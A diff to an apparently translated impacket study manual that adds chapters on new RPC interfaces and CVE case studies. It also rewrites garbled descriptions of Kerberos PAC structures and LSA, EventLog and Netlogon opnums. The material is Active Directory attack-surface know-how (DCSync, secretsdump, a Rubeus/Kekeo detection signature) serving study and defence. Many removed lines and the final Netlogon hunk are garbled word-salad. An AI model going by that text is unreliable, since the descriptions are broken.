@@ -19,6 +19,8 @@ The manual is organized as "Foundations → Authentication & Directory → RPC i
 | Part III DCE/RPC | Ch. 5 dcerpc | Read the RPC basics first (NDR, rpcrt, epm, transport), then pick interface modules by functional group | Ch. 2, 4 |
 | Part IV DCOM & WMI | Ch. 6 MS-DCOM | DCOM programming, dcomrt, oaut/wmi submodules | Ch. 5 |
 | Part V Support libraries | Ch. 7 common | Quick tour of SMB, DPAPI, NTDS support modules | as needed |
+| Part VI New interfaces & case studies | Ch. 8 interfaces and support libraries added in 0.12-0.14 | ICPR, GKDI, NEGOEX, RAA, SCMR, `acl.py`, `dpapi_ng.py` | Ch. 2, 5 |
+| | Ch. 9 case studies | BadSuccessor (CVE-2025-53779) and CVE-2025-33073, PoC walk-throughs | Ch. 3, 5 |
 
 Within Part III, the dcerpc interface modules fall into five functional groups (the text roughly follows this grouping, so you can read by group):
 
@@ -27,6 +29,8 @@ Within Part III, the dcerpc interface modules fall into five functional groups (
 3. **System & operations**: even6, iphlp, rrp (registry), rprn / par (printing), srvs (shares), wkst, tsts, MS-TSCH (scheduled tasks), dhcpm;
 4. **Exchange-related**: nspi, oxabref, rpch;
 5. **Credentials & directory replication**: bkrp, drsuapi (DCSync), dssp.
+
+Part VI then adds the interfaces and support libraries introduced by impacket 0.12-0.14 that the groups above predate: the certificate-enrollment interface **ICPR**, the group key distribution protocol **GKDI**, the SPNEGO extended negotiation **NEGOEX**, the remote authorization API **RAA**, the service control manager **SCMR**, plus the **`acl.py`** and **`dpapi_ng.py`** support modules.
 
 [TOC].
 
@@ -42,6 +46,7 @@ C:.
 │   # impacket root: protocol implementations and base modules
 │   cdp.py / crypto.py / dhcp.py / dns.py / dot11.py / Dot11Crypto.py
 │   dpapi.py / ese.py / http.py / nmb.py / ntlm.py / spnego.py
+│   negoex.py / acl.py / dpapi_ng.py / helper.py / winregistry.py / mqtt.py
 │   smb.py / smb3.py / smb3structs.py / smbconnection.py / smbserver.py
 │   structure.py / system_errors.py / tds.py / uuid.py / version.py / wps.py ...
 │
@@ -52,12 +57,14 @@ C:.
 │       │   lsad.py / lsat.py / mimilib.py / nrpc.py / nspi.py / oxabref.py
 │       │   par.py / rpch.py / rprn.py / rrp.py / samr.py / srvs.py
 │       │   tsch.py / tsts.py / wkst.py / dcomrt.py ...
+│       │   icpr.py / gkdi.py / raa.py / scmr.py / sasec.py / mgmt.py / iphlp.py / even.py   # new in Part VI
 │       │
 │       └───dcom          # DCOM submodules (Part VI)
 │               comev.py / oaut.py / scmp.py / vds.py / wmi.py
 │
 ├───examples              # common domain-pentest scripts: getTGT / getST / ticketer / secretsdump
 │   │                     # psexec / wmiexec / atexec / dcomexec / rpcmap / netview ...
+│   │                     # badsuccessor / describeTicket / CheckLDAPStatus / regsecrets ...
 │   └───ntlmrelayx        # NTLM relay framework (attacks / clients / servers /
 │                         #   socksplugins / utils subtrees omitted)
 │
@@ -931,26 +938,26 @@ Now let's see what the AS_REQ header and req-body actually contain:
 
 ```
 1.pvno Kerberos protocol version
-2.msg-type message typeKRB_AS_REQ(0x0a)
-3.PA_DATA Pre-authentication Data，pre-authentication data，each auth message has type and value。
-PA-DATA PA-ENC-TIMESTAMP userHASHtimestamp
+2.msg-type message type KRB_AS_REQ(0x0a)
+3.PA_DATA Pre-authentication Data, pre-authentication data; each auth message has a type and a value.
+PA-DATA PA-ENC-TIMESTAMP user HASH-encrypted timestamp
 	padata-type: padata type
 		padata-value: padata value
 			etype:  encryption type
 			cipher: encrypted value
-PA-DATA PA-PAC-REQUEST：PAC extension
+PA-DATA PA-PAC-REQUEST: PAC extension
 	padata-type: padata type
 		padata-value: padata value
-		include-pac: whether to include PAC，if included, PAC is returned in the response
+		include-pac: whether to include PAC; if included, PAC is returned in the response
 4.req-body request body
 padding:padding
 kdc-options:KDC option settings
 cname: client username
 realm: realm 
-sname: server username，in AS_REQ sname is krbtgt，type is KRB_NT_SRV_INST
-till: expiry timerubeuskekeo20370913024805Zcan be used as detection signature
-nonce：randomly generated number，for replay detection
-etype: encryption typeKDC selects encryption per etype
+sname: server username; in AS_REQ sname is krbtgt, type is KRB_NT_SRV_INST
+till: expiry time; rubeus and kekeo both use 20370913024805Z, which can be used as a detection signature
+nonce: randomly generated number, for replay detection
+etype: encryption type; the KDC selects encryption per etype
 ```
 
 In the AS_REP reply you can see the TGT and the session key encrypted with the user key (enc-part).
@@ -1028,64 +1035,64 @@ The module mainly provides the PAC data structures, shown below:
 
 ```python
 class KERB_SID_AND_ATTRIBUTES(NDRSTRUCT):
-# used forSIDand inKERB_VALIDATION_INFOused forcontaining SID groupinformation
-    
+# A SID together with its attributes, used inside KERB_VALIDATION_INFO to describe group membership
+
 class KERB_SID_AND_ATTRIBUTES_ARRAY(NDRUniConformantArray):
 class PKERB_SID_AND_ATTRIBUTES_ARRAY(NDRPOINTER):
-    
+
 class DOMAIN_GROUP_MEMBERSHIP(NDRSTRUCT):
-# domaingroupinPAC_DEVICE_INFO
-    
+# A domain plus the group RIDs the account belongs to; also used inside PAC_DEVICE_INFO
+
 class DOMAIN_GROUP_MEMBERSHIP_ARRAY(NDRUniConformantArray):
 class PDOMAIN_GROUP_MEMBERSHIP_ARRAY(NDRPOINTER):
-    
+
 class PACTYPE(Structure):
-# PACTYPE PAC specified PAC_INFO_BUFFERgroup PACTYPE PAC
-    
+# PACTYPE is the top-level PAC container; it is followed by an array of PAC_INFO_BUFFER entries
+
 class PAC_INFO_BUFFER(Structure):
-# inPACTYPEPAC_INFO_BUFFERgroup PAC PAC_INFO_BUFFERgroup thisPAC_INFO_BUFFER (KDC) servernotthen PAC
-    
-    
+# Each PAC_INFO_BUFFER describes one buffer inside the PAC: a type, an offset (relative to the PAC start) and a length. The KDC/server use it to locate each structure
+
+
 class KERB_VALIDATION_INFO(NDRSTRUCT):
-# KERB_VALIDATION_INFO DC userinformation KERB_VALIDATION_INFOisasgroupinPACTYPE BuffersgroupPAC_INFO_BUFFER OffsetspecifiedPAC_INFO_BUFFER ulTypesetsas 0x00000001
-# KERB_VALIDATION_INFO NETLOGON_VALIDATION_SAM_INFO4 outputand Active Directory thisinformationNTLM inserverwithdomain NETLOGON_VALIDATION_SAM_INFO4 this KERB_VALIDATION_INFO including NTLM and NTLM notused for [MS-KILE] KERB_VALIDATION_INFO RPC [MS-RPCE] group
-    
+# KERB_VALIDATION_INFO mirrors the user's authorization data. It travels in a PAC_INFO_BUFFER whose ulType is 0x00000001
+# It is the Kerberos counterpart of NTLM's NETLOGON_VALIDATION_SAM_INFO4: the DC fills it from Active Directory so that both NTLM and Kerberos report the same group membership. It maps to the RPC [MS-RPCE] structure of the same name ([MS-KILE])
+
 class PKERB_VALIDATION_INFO(NDRPOINTER):
-    
+
 class PAC_CREDENTIAL_INFO(Structure):
-# PAC_CREDENTIAL_INFOinformationPAC_CREDENTIAL_INFOused forIDLPAC_CREDENTIAL_DATAcontaininguserthisnotis[MS-KILE] method Kerberos AS-REQPAC_CREDENTIAL_INFOcontaininguser AS PKINITcontaining PAC thisAS reply key PKINIT output
-    
+# PAC_CREDENTIAL_INFO carries supplemental credentials. Its IDL-defined PAC_CREDENTIAL_DATA holds the user's credentials; because it is not used by default in a Kerberos AS-REQ, it is mainly produced when the PAC is issued via PKINIT, where the AS reply key encrypts it ([MS-KILE])
+
 class SECPKG_SUPPLEMENTAL_CRED(NDRSTRUCT):
-# nameandthe
+# A single supplemental credential: a security package name plus the credential blob
 class SECPKG_SUPPLEMENTAL_CRED_ARRAY(NDRUniConformantArray):
-    
+
 class PAC_CREDENTIAL_DATA(NDRSTRUCT):
-# group Kerberos client
-    
+# The Kerberos client's credential data, as an array of SECPKG_SUPPLEMENTAL_CRED
+
 class NTLM_SUPPLEMENTAL_CREDENTIAL(NDRSTRUCT):
-# used for NTLM LAN Manager(LM OWF)NT(NT OWF).PAC the[MS-NLMP]specifiedinformation PKINIT [MS-PKCA] usercontaining PAC NTLM_SUPPLEMENTAL_CREDENTIAL RPC [MS-RPCE]
-    
+# NTLM supplemental credential: the LAN Manager OWF and NT OWF hashes. When a PAC carries credentials per [MS-NLMP] and was delivered via PKINIT [MS-PKCA], the user's NTLM_SUPPLEMENTAL_CREDENTIAL goes here; it maps to the RPC [MS-RPCE] structure
+
 class PAC_CLIENT_INFO(Structure):
-# PACcontainingclientnameused for PAC ticketclientPAC_CLIENT_INFO in PACTYPE Buffers groupBuffersgroupPAC_INFO_BUFFEROffset specifiedPAC_INFO_BUFFERulType setsas 0x0000000A
-    
+# PAC_CLIENT_INFO identifies the client (name and logon time) for the ticket. It travels in a PAC_INFO_BUFFER whose ulType is 0x0000000A
+
 class PAC_SIGNATURE_DATA(Structure):
-# PAC_SIGNATURE_DATAserverKDC PACPACTYPE BuffersgroupBuffersgroupPAC_INFO_BUFFER Offsetspecified PAC_INFO_BUFFERulTypecontaining0x00000006PAC_INFO_BUFFERulType KDC containing 0x00000007 PAC is[MS-KILE] PAC asused for KDC can PAC
-    
+# PAC_SIGNATURE_DATA holds the server/KDC signature over the PAC. It travels in a PAC_INFO_BUFFER whose ulType is 0x00000006, while a KDC checksum uses ulType 0x00000007 ([MS-KILE])
+
 class S4U_DELEGATION_INFO(NDRSTRUCT):
-# S4U_DELEGATION_INFOused forinformation outputthis Kerberos clientorserverthelistused foruser (S4U2proxy)thiscanin
-    
+# S4U_DELEGATION_INFO records the delegation path: the intermediate services (S4U2proxy) and the user being impersonated
+
 class UPN_DNS_INFO(Structure):
-# containingclient UPN realm (FQDN)SAM name SIDused forwithticketclient UPNFQDNSAM name SIDUPN_DNS_INFOin PACTYPE groupgroup PAC_INFO_BUFFERspecified PAC_INFO_BUFFERulTypesetsas 0x0000000C
-    
+# UPN_DNS_INFO carries the client's UPN, DNS domain name (FQDN), SAM name and SID. It travels in a PAC_INFO_BUFFER whose ulType is 0x0000000C
+
 class PAC_CLIENT_CLAIMS_INFO(Structure):
-# PAC thecontainingclientgroup blobPAC_CLIENT_CLAIMS_INFO in PACTYPEBuffers group,BuffersgroupPAC_INFO_BUFFER Offsetspecified PAC_INFO_BUFFERulTypesetsas 0x0000000D
-    
+# PAC_CLIENT_CLAIMS_INFO carries the client's claims blob. It travels in a PAC_INFO_BUFFER whose ulType is 0x0000000D
+
 class PAC_DEVICE_INFO(NDRSTRUCT):
-# PAC thecontainingDCinformationPAC_DEVICE_INFOisasgroupinPACTYPE groupPAC_INFO_BUFFER specifiedPAC_INFO_BUFFERulTypesetsas 0x0000000E
-    
+# PAC_DEVICE_INFO carries device (computer) information filled in by the DC. It travels in a PAC_INFO_BUFFER whose ulType is 0x0000000E
+
 class PAC_DEVICE_CLAIMS_INFO(Structure):
-# PAC thecontainingclientgroupblobPAC_DEVICE_CLAIMS_INFO in PACTYPE Buffers group BuffersgroupPAC_INFO_BUFFER Offsetspecified PAC_INFO_BUFFERulTypesetsas 0x0000000F
-    
+# PAC_DEVICE_CLAIMS_INFO carries the device claims blob. It travels in a PAC_INFO_BUFFER whose ulType is 0x0000000F
+
 class VALIDATION_INFO(TypeSerialization1):
 ```
 
@@ -1470,16 +1477,16 @@ The methods implemented by the two versions:
 
 ```
 OPNUMS = {
- 0 : (ElfrClearELFW, ElfrClearELFWResponse),Instructs the server toeventlogcanineventlog
- 1 : (ElfrBackupELFW, ElfrBackupELFWResponse),Instructs the server toeventlogspecified
-    2   : (ElfrCloseEL, ElfrCloseELResponse),Instructs the server tocloseseventloghandle
- 4 : (ElfrNumberOfRecords, ElfrNumberOfRecordsResponse), Instructs the server toeventlogcurrent
+ 0 : (ElfrClearELFW, ElfrClearELFWResponse),Instructs the server to clear the event log, optionally backing it up first
+ 1 : (ElfrBackupELFW, ElfrBackupELFWResponse),Instructs the server to back up the event log to the specified file name
+    2   : (ElfrCloseEL, ElfrCloseELResponse),Instructs the server to close the handle to an event log
+ 4 : (ElfrNumberOfRecords, ElfrNumberOfRecordsResponse),Instructs the server to report the current number of records in the event log
     5   : (ElfrOldestRecord, ElfrOldestRecordResponse),
-    7   : (ElfrOpenELW, ElfrOpenELWResponse),
- 8 : (ElfrRegisterEventSourceW, ElfrRegisterEventSourceWResponse),Instructs the server toserveronhandlereturnseventlog entry
- 9 : (ElfrOpenBELW, ElfrOpenBELWResponse),Instructs the server toreturnseventloghandle
- 10 : (ElfrReadELW, ElfrReadELWResponse),methodeventlogeventservereventclientinwithinLogHandleserveronhandleeventlog
- 11 : (ElfrReportEventW, ElfrReportEventWResponse), method event entryeventlogserverclientevent
+    7   : (ElfrOpenELW, ElfrOpenELWResponse),Instructs the server to return a handle to the backup event log; the caller needs read access to the file, and note the server keeps an ACL controlling log access (this protocol cannot read or set it)
+ 8 : (ElfrRegisterEventSourceW, ElfrRegisterEventSourceWResponse),Instructs the server to return a server context handle to the event log for writing
+ 9 : (ElfrOpenBELW, ElfrOpenBELWResponse),Instructs the server to return a handle to the backup event log
+ 10 : (ElfrReadELW, ElfrReadELWResponse),Reads events from the event log; the server returns them to the client and advances the reader position in the log associated with the LogHandle context
+ 11 : (ElfrReportEventW, ElfrReportEventWResponse),Writes events to the event log; the server receives them from the client
 }
 ```
 
@@ -1487,12 +1494,12 @@ even6.py (version 6):
 
 ```
 OPNUMS = {
- 5 : (EvtRpcRegisterLogQuery, EvtRpcRegisterLogQueryResponse),used forqueriesorcanused forquerieseventretrievesEvtRpcQueryNext 3.1.4.13 method
- 11 : (EvtRpcQueryNext, EvtRpcQueryNextResponse),client EvtRpcQueryNext (Opnum 11) methodqueriesobtains
- 12 : (EvtRpcQuerySeek, EvtRpcQuerySeekResponse),client EvtRpcQuerySeek (Opnum 12) methodinqueries
- 13 : (EvtRpcClose, EvtRpcCloseResponse),client EvtRpcClose (Opnum 13) methodclosesmethodopensonhandle
- 17 : (EvtRpcOpenLogHandle, EvtRpcOpenLogHandle), methodobtainsoreventloginformation
- 19 : (EvtRpcGetChannelList, EvtRpcGetChannelListResponse),EvtRpcGetChannelList (Opnum 19) methodused forenumerates
+ 5 : (EvtRpcRegisterLogQuery, EvtRpcRegisterLogQueryResponse),Registers a query over one or more channels (or a specific file); the actual retrieval is done by subsequent EvtRpcQueryNext (3.1.4.13) calls
+ 11 : (EvtRpcQueryNext, EvtRpcQueryNextResponse),The client uses EvtRpcQueryNext (Opnum 11) to fetch the next batch of records from the query result set
+ 12 : (EvtRpcQuerySeek, EvtRpcQuerySeekResponse),The client uses EvtRpcQuerySeek (Opnum 12) to move the query cursor within the result set
+ 13 : (EvtRpcClose, EvtRpcCloseResponse),The client uses EvtRpcClose (Opnum 13) to close a context handle opened by another method of this protocol
+ 17 : (EvtRpcOpenLogHandle, EvtRpcOpenLogHandle),Obtains information about a channel or a backup event log
+ 19 : (EvtRpcGetChannelList, EvtRpcGetChannelListResponse),EvtRpcGetChannelList (Opnum 19) enumerates the set of available channels
 }
 ```
 
@@ -1635,41 +1642,41 @@ resp = hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | POLICY_LOOKUP_NAMES)
 Next, let's see which interface methods the module currently implements:
 
 ```python
-0 : (LsarClose, LsarCloseResponse), methodreleasesopensonhandle
- 2 : (LsarEnumeratePrivileges, LsarEnumeratePrivilegesResponse),method toenumerates allcanthismethodreturns output
- 3 : (LsarQuerySecurityObject, LsarQuerySecurityObjectResponse),method toqueriesobjectinformationreturnsobject
- 4 : (LsarSetSecurityObject, LsarSetSecurityObjectResponse),Called toinobjectonsets
- 6 : (LsarOpenPolicy, LsarOpenPolicyResponse),methodwithLsarOpenPolicy2notinthisSystemNamecontainingnotthisSystemNamemustis
- 7 : (LsarQueryInformationPolicy, LsarQueryInformationPolicyResponse),method toqueriesserverinformationpolicy
- 8 : (LsarSetInformationPolicy, LsarSetInformationPolicyResponse),Called toinserveronsetspolicy。
-10 : (LsarCreateAccount, LsarCreateAccountResponse),Called toinservercreates aobject
-11 : (LsarEnumerateAccounts, LsarEnumerateAccountsResponse),methodserverobjectlistcanthemethodreturns output
-13 : (LsarEnumerateTrustedDomains, LsarEnumerateTrustedDomainsResponse),
-16 : (LsarCreateSecret, LsarCreateSecretResponse),isinservercreates aobject
-17 : (LsarOpenAccount, LsarOpenAccountResponse),
-18 : (LsarEnumeratePrivilegesAccount, LsarEnumeratePrivilegesAccountResponse),retrievesserveronlist
-19 : (LsarAddPrivilegesToAccount, LsarAddPrivilegesToAccountResponse),
-20 : (LsarRemovePrivilegesFromAccount, LsarRemovePrivilegesFromAccountResponse),
-23 : (LsarGetSystemAccessAccount, LsarGetSystemAccessAccountResponse),retrievesobjectisasobject
-24 : (LsarSetSystemAccessAccount, LsarSetSystemAccessAccountResponse),asobjectsets
-28 : (LsarOpenSecret, LsarOpenSecretResponse),
-29 : (LsarSetSecret, LsarSetSecretResponse),setsobjectcurrent
-30 : (LsarQuerySecret, LsarQuerySecretResponse),retrievesobjectcurrentor
-31 : (LsarLookupPrivilegeValue, LsarLookupPrivilegeValueResponse),
-32 : (LsarLookupPrivilegeName, LsarLookupPrivilegeNameResponse),
-33 : (LsarLookupPrivilegeDisplayName, LsarLookupPrivilegeDisplayNameResponse),
-34 : (LsarDeleteObject, LsarDeleteObjectResponse),deletesobjectobjectordomainobject
-35 : (LsarEnumerateAccountsWithUserRight, LsarEnumerateAccountsWithUserRightResponse),returnsuser entryobjectlist
-36 : (LsarEnumerateAccountRights, LsarEnumerateAccountRightsResponse),
-37 : (LsarAddAccountRights, LsarAddAccountRightsResponse),
-38 : (LsarRemoveAccountRights, LsarRemoveAccountRightsResponse),
-42 : (LsarStorePrivateData, LsarStorePrivateDataResponse),
-43 : (LsarRetrievePrivateData, LsarRetrievePrivateDataResponse),retrieves
-44 : (LsarOpenPolicy2, LsarOpenPolicy2Response),opensRPC serveronhandledomainpolicymust
-46 : (LsarQueryInformationPolicy2, LsarQueryInformationPolicy2Response),queriesserverpolicy
-47 : (LsarSetInformationPolicy2, LsarSetInformationPolicy2Response),inserveronsetspolicy
-50 : (LsarEnumerateTrustedDomainsEx, LsarEnumerateTrustedDomainsExResponse),enumeratesserverdomainobject themethodinretrieves
-53 : (LsarQueryDomainInformationPolicy, LsarQueryDomainInformationPolicyResponse),
+0 : (LsarClose, LsarCloseResponse),Frees the resources held by a previously opened context handle
+ 2 : (LsarEnumeratePrivileges, LsarEnumeratePrivilegesResponse),Enumerates all privileges known to the system; may be called multiple times to return its output in fragments
+ 3 : (LsarQuerySecurityObject, LsarQuerySecurityObjectResponse),Queries the security information assigned to a database object and returns its security descriptor
+ 4 : (LsarSetSecurityObject, LsarSetSecurityObjectResponse),Sets a security descriptor on an object
+ 6 : (LsarOpenPolicy, LsarOpenPolicyResponse),Identical to LsarOpenPolicy2, except that SystemName here, due to its syntax definition, holds a single character rather than a full string; it has no effect on message processing and must be ignored
+ 7 : (LsarQueryInformationPolicy, LsarQueryInformationPolicyResponse),Queries the values representing the server information policy
+ 8 : (LsarSetInformationPolicy, LsarSetInformationPolicyResponse),Sets policy on the server
+10 : (LsarCreateAccount, LsarCreateAccountResponse),Creates a new account object in the server database
+11 : (LsarEnumerateAccounts, LsarEnumerateAccountsResponse),Requests the list of account objects in the server database; may be called multiple times to return its output in fragments
+13 : (LsarEnumerateTrustedDomains, LsarEnumerateTrustedDomainsResponse),Requests the list of trusted domain objects in the server database; may be called multiple times to return its output in fragments
+16 : (LsarCreateSecret, LsarCreateSecretResponse),Creates a new secret object in the server database
+17 : (LsarOpenAccount, LsarOpenAccountResponse),Obtains a handle to an account object
+18 : (LsarEnumeratePrivilegesAccount, LsarEnumeratePrivilegesAccountResponse),Retrieves the list of privileges granted to an account on the server
+19 : (LsarAddPrivilegesToAccount, LsarAddPrivilegesToAccountResponse),Adds new privileges to an existing account object
+20 : (LsarRemovePrivilegesFromAccount, LsarRemovePrivilegesFromAccountResponse),Removes privileges from an account object
+23 : (LsarGetSystemAccessAccount, LsarGetSystemAccessAccountResponse),Retrieves the system access account flags of an account object (part of the account object's data model)
+24 : (LsarSetSystemAccessAccount, LsarSetSystemAccessAccountResponse),Sets the system access account flags of an account object
+28 : (LsarOpenSecret, LsarOpenSecretResponse),Obtains a handle to an existing secret object
+29 : (LsarSetSecret, LsarSetSecretResponse),Sets the current and old values of a secret object
+30 : (LsarQuerySecret, LsarQuerySecretResponse),Retrieves the current and old (previous) values of a secret object
+31 : (LsarLookupPrivilegeValue, LsarLookupPrivilegeValueResponse),Maps a privilege name to a locally unique identifier (LUID) by which the privilege is known on the server; the LUID can then be used in later calls such as LsarAddPrivilegesToAccount
+32 : (LsarLookupPrivilegeName, LsarLookupPrivilegeNameResponse),Maps a privilege LUID to the string name by which it is known on the server
+33 : (LsarLookupPrivilegeDisplayName, LsarLookupPrivilegeDisplayNameResponse),Maps a privilege name to a display text string in the caller's language
+34 : (LsarDeleteObject, LsarDeleteObjectResponse),Deletes a public account object, secret object, or trusted domain object
+35 : (LsarEnumerateAccountsWithUserRight, LsarEnumerateAccountsWithUserRightResponse),Returns the list of account objects whose user rights equal the passed value
+36 : (LsarEnumerateAccountRights, LsarEnumerateAccountRightsResponse),Retrieves the list of rights associated with an existing account
+37 : (LsarAddAccountRights, LsarAddAccountRightsResponse),Adds new rights to an account object; if the account object does not exist, the system tries to create it
+38 : (LsarRemoveAccountRights, LsarRemoveAccountRightsResponse),Removes rights from an account object
+42 : (LsarStorePrivateData, LsarStorePrivateDataResponse),Stores a secret value
+43 : (LsarRetrievePrivateData, LsarRetrievePrivateDataResponse),Retrieves a secret value
+44 : (LsarOpenPolicy2, LsarOpenPolicy2Response),Opens a context handle to the RPC server; this is the first function that must be called to contact the Local Security Authority (domain policy) remote protocol database
+46 : (LsarQueryInformationPolicy2, LsarQueryInformationPolicy2Response),Queries the values representing the server security policy
+47 : (LsarSetInformationPolicy2, LsarSetInformationPolicy2Response),Sets policy on the server
+50 : (LsarEnumerateTrustedDomainsEx, LsarEnumerateTrustedDomainsExResponse),Enumerates the trusted domain objects in the server database; intended to be called multiple times to retrieve the data in fragments
+53 : (LsarQueryDomainInformationPolicy, LsarQueryDomainInformationPolicyResponse),Retrieves policy settings in addition to those exposed by LsarQueryInformationPolicy and LsarSetInformationPolicy2; despite "Domain" in the name, processing uses local data and need not relate to the LSA of the joined domain
 
 ```
 
@@ -1711,9 +1718,9 @@ The module implements the following interface methods:
 
 ```python
 OPNUMS = {
- 14 : (LsarLookupNames, LsarLookupNamesResponse),method principal nameasSIDreturnsnamedomain
- 15 : (LsarLookupSids, LsarLookupSidsResponse),
- 45 : (LsarGetUserName, LsarGetUserNameResponse), methodreturns themethodnamerealm
+ 14 : (LsarLookupNames, LsarLookupNamesResponse),Converts a batch of security principal names to their SID form and returns the domains those names belong to
+ 15 : (LsarLookupSids, LsarLookupSidsResponse),Converts a batch of security principal SIDs to their name form and returns the domains those names belong to
+ 45 : (LsarGetUserName, LsarGetUserNameResponse),Returns the name and domain of the security principal that called the method
     
     
  57 : (LsarLookupSids2, LsarLookupSids2Response),
@@ -1730,7 +1737,7 @@ OPNUMS = {
  76 : (LsarLookupSids3, LsarLookupSids3Response),
  RPC serverdomainthisif RPC servernotdomainthen RPC servermustinreturnsreturns STATUS_INVALID_SERVER_STATE
     
- 77 : (LsarLookupNames4, LsarLookupNames4Response),
+ 77 : (LsarLookupNames4, LsarLookupNames4Response),Valid only when the RPC server is a domain controller; otherwise it must return STATUS_INVALID_SERVER_STATE
 }
 ```
 
@@ -1753,13 +1760,13 @@ Per the interface ID defined at the top, this is the RPC remote management inter
 
 ```python
 OPNUMS = {
- 0 : (inq_if_ids, inq_if_idsResponse),queriesif id/obtains outputin RPC runtimeifserverthisreturns rpc_s_no_interfaces NULL if_id_vectorrpc_if_id_vector_free releasesvector
+ 0 : (inq_if_ids, inq_if_idsResponse),Queries the if_id vector, a management routine that lists the interfaces registered with the RPC runtime; returns rpc_s_no_interfaces and NULL if none are registered, and the caller must call rpc_if_id_vector_free to release it
     
- 1 : (inq_stats, inq_statsResponse), queriesused forobtainsspecifiedserver RPC runtime informationreturns
+ 1 : (inq_stats, inq_statsResponse),Queries the statistics of the RPC runtime on the specified server; each returned element is an integer matching a defined statistic constant
     
  2 : (is_server_listening, is_server_listeningResponse),
  3 : (stop_server_listening, stop_server_listeningResponse),
- 4 : (inq_princ_name, inq_princ_nameResponse),queriesname.asserverprincipal nameonprincipal name
+ 4 : (inq_princ_name, inq_princ_nameResponse),A manager routine that provides the remote caller with the server's principal name (one of its principal names)
 }
 ```
 
@@ -2092,53 +2099,53 @@ Next let's see which Netlogon methods the module implements:
 
 ```python
 OPNUMS = {
- 0 : (NetrLogonUasLogon, NetrLogonUasLogonResponse),
- 1 : (NetrLogonUasLogoff, NetrLogonUasLogoffResponse),
- 2 : (NetrLogonSamLogon, NetrLogonSamLogonResponse),NetrLogonSamLogonWithFlags methodpredecessor of
- 3 : (NetrLogonSamLogoff, NetrLogonSamLogoffResponse),
- 4 : (NetrServerReqChallenge, NetrServerReqChallengeResponse),
- 5 : (NetrServerAuthenticate, NetrServerAuthenticateResponse),NetrServerAuthenticate3 methodpredecessor of。
+ 0 : (NetrLogonUasLogon, NetrLogonUasLogonResponse),Logon method (obsoleted)
+ 1 : (NetrLogonUasLogoff, NetrLogonUasLogoffResponse),Logoff method (obsoleted)
+ 2 : (NetrLogonSamLogon, NetrLogonSamLogonResponse),Predecessor of the NetrLogonSamLogonWithFlags method
+ 3 : (NetrLogonSamLogoff, NetrLogonSamLogoffResponse),Updates the lastLogoff attribute of a SAM account
+ 4 : (NetrServerReqChallenge, NetrServerReqChallengeResponse),Receives the client challenge and returns the server challenge (SC)
+ 5 : (NetrServerAuthenticate, NetrServerAuthenticateResponse),Predecessor of the NetrServerAuthenticate3 method
 # 6 : (NetrServerPasswordSet, NetrServerPasswordSetResponse),
- 7 : (NetrDatabaseDeltas, NetrDatabaseDeltasResponse),returnsinSAM SAM orLSA grouporBDCPDCBDCon
- 8 : (NetrDatabaseSync, NetrDatabaseSyncResponse),NetrDatabaseSync2 methodpredecessor of
-# 9 : (NetrAccountDeltas, NetrAccountDeltasResponse),methodobsolete
-# 10 : (NetrAccountSync, NetrAccountSyncResponse),methodobsolete
- 11 : (NetrGetDCName, NetrGetDCNameResponse),used forretrievesspecifieddomainPDCNetBIOS name。
- 12 : (NetrLogonControl, NetrLogonControlResponse),NetrLogonControl2Ex methodpredecessor of
- 13 : (NetrGetAnyDCName, NetrGetAnyDCNameResponse),used forretrievesspecifieddomainordomaindomainname DC canreturns the specifieddomain DC name
- 14 : (NetrLogonControl2, NetrLogonControl2Response),NetrLogonControl2Ex methodpredecessor of
- 15 : (NetrServerAuthenticate2, NetrServerAuthenticate2Response),
- 16 : (NetrDatabaseSync2, NetrDatabaseSync2Response),returnsgroupused forspecifiedallas BDC withPDC. returnsthisinreturnsallthisthismethodoninretrievesalleventthisthemethodinspecifiedmustin
- 17 : (NetrDatabaseRedo, NetrDatabaseRedoResponse),
- 18 : (NetrLogonControl2Ex, NetrLogonControl2ExResponse),used forqueries Netlogon server
- 19 : (NetrEnumerateTrustedDomains, NetrEnumerateTrustedDomainsResponse),returnsgroupdomainNetBIOSname
- 20 : (DsrGetDcName, DsrGetDcNameResponse),DsrGetDcNameEx2 methodpredecessor of
- 21 : (NetrLogonGetCapabilities, NetrLogonGetCapabilitiesResponse),clientNetrLogonGetCapabilitiesmethodinserver
- 22 : (NetrLogonSetServiceBits, NetrLogonSetServiceBitsResponse),used for Netlogondomaininspecified
- 23 : (NetrLogonGetTrustRid, NetrLogonGetTrustRidResponse),used forthisserverobtainsspecifieddomaindomain used for passwordRID
- 24 : (NetrLogonComputeServerDigest, NetrLogonComputeServerDigestResponse),
- 25 : (NetrLogonComputeClientDigest, NetrLogonComputeClientDigestResponse),
- 26 : (NetrServerAuthenticate3, NetrServerAuthenticate3Response),
- 27 : (DsrGetDcNameEx, DsrGetDcNameExResponse),DsrGetDcNameEx2methodpredecessor of
- 28 : (DsrGetSiteName, DsrGetSiteNameResponse),returnsthisspecified name
- 29 : (NetrLogonGetDomainInfo, NetrLogonGetDomainInfoResponse),returnsspecifiedclientcurrentdomaininformation
- 30 : (NetrServerPasswordSet2, NetrServerPasswordSet2Response),
- 31 : (NetrServerPasswordGet, NetrServerPasswordGetResponse),
- 32 : (NetrLogonSendToSam, NetrLogonSendToSamResponse),
- 33 : (DsrAddressToSiteNamesW, DsrAddressToSiteNamesWResponse),
- 34 : (DsrGetDcNameEx2, DsrGetDcNameEx2Response),returns information aboutspecifieddomaindomain (DC)informationifAccountName notas NULLFlags DC inthismethodthenthe DC DC containingspecifiedAccountName thisservernot DC
- 35 : (NetrLogonGetTimeServiceParentDomain, NetrLogonGetTimeServiceParentDomainResponse),returnscurrentdomainrealmthemethodreturnsrealm entryNetrLogonGetTrustRid methodNetrLogonComputeClientDigest method
- 36 : (NetrEnumerateTrustedDomainsEx, NetrEnumerateTrustedDomainsExResponse),returns specifiedserver domainlist
- 37 : (DsrAddressToSiteNamesExW, DsrAddressToSiteNamesExWResponse),
- 38 : (DsrGetDcSiteCoverageW, DsrGetDcSiteCoverageWResponse),returnsdomain list
- 39 : (NetrLogonSamLogonEx, NetrLogonSamLogonExResponse),
- 40 : (DsrEnumerateDomainTrusts, DsrEnumerateDomainTrustsResponse),
- 41 : (DsrDeregisterDnsHostRecords, DsrDeregisterDnsHostRecordsResponse),
- 42 : (NetrServerTrustPasswordsGet, NetrServerTrustPasswordsGetResponse),returnsdomaincurrentpasswordclientthismethoddomainretrievescurrentpassword
- 43 : (DsrGetForestTrustInformation, DsrGetForestTrustInformationResponse),retrievesspecifieddomain (DC)orspecified DC information
- 44 : (NetrGetForestTrustInformation, NetrGetForestTrustInformationResponse),retrievesdomain information
